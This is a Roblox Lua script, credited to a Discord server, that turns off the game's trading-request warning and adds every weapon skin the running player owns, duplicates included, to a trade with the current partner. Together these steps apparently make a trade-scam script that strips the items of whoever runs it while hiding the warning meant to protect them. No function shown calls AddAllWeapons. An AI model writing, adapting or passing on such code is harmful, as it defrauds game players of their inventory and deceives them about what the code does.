game:GetService("Players").LocalPlayer.PlayerGui.Main.MainTradingRequestsFrame.warning.Visible=false

-- Source code by: https://discord.com/invite/zNZ3MrRaxF

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local lp = Players.LocalPlayer
local gui = lp:WaitForChild("PlayerGui")
local TradeItemRemote = ReplicatedStorage:WaitForChild("TradeItem")
local ItemData = require(ReplicatedStorage:WaitForChild("Item"))

local effectItemsCache = nil

local function GetEffectItems()
    if not effectItemsCache then
        effectItemsCache = {}
        for itemName, data in pairs(ItemData) do
            if data.ItemType == "Effect" then
                effectItemsCache[itemName] = true
            end
        end
    end
    return effectItemsCache
end

local function GetTradingPartner()
    local frame = gui.Main.MainTradingFrame
    if not frame then return nil end
    
    local text = frame.Slots.TradingPlayerName.Text
    local username = text:match("@(.+)%)")
    
    if username then 
        return Players:FindFirstChild(username) 
    end
    return nil
end

local function GetAllMyWeapons()
    local weapons = {}
    local effectItems = GetEffectItems()

    for _, item in ipairs(lp.SkinsFolder:GetChildren()) do
        if item:IsA("StringValue")
            and item.Name ~= "DefaultGun"
            and item.Name ~= "DefaultKnife"
            and not effectItems[item.Name] then

            local count = item:FindFirstChild("Count") and item.Count.Value or 1

            for i = 1, count do
                table.insert(weapons, item.Name)
            end
        end
    end

    return weapons
end

local function AddAllWeapons(partner)
    local weapons = GetAllMyWeapons()
    
    for _, weaponName in ipairs(weapons) do
        task.spawn(function()
            TradeItemRemote:InvokeServer("ADD_TO_TRADE", partner, weaponName, {})
        end)
    end
end

